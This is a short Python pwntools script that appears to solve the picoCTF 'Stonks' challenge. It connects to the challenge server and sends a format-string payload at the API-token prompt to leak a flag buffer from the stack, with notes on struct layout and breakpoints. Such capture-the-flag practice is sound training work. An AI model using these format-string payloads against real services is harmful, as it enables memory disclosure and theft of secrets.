'''

size of Stonk = 0x18
+0x0: shares
+0x8: char symbol
+0x10: struct Stonks *next

0x7fffffffe410 stores flag buffer

buy_stonks+226 start of while loop:

	buy_stonks+169 stores eax containing shares

	calls pick_symbol_with_AI(shares):
	
	*** API TOKEN user input

'''

from pwn import *

local_bin = "./vuln"

p = remote("mercury.picoctf.net" ,6989)
#p = gdb.debug(local_bin, '''
	#break main
	#break buy_stonks
	#break *buy_stonks+232
	#break *buy_stonks+301
	#break *buy_stonks+318
  	#''')

output = p.recvuntil(b'portfolio')
p.sendline(b'1')


output = p.recvuntil(b'token')
payload = b'%qx-' * 5 + b'%s'
#payload = b'%6$s'
p.sendline(payload)

p.interactive()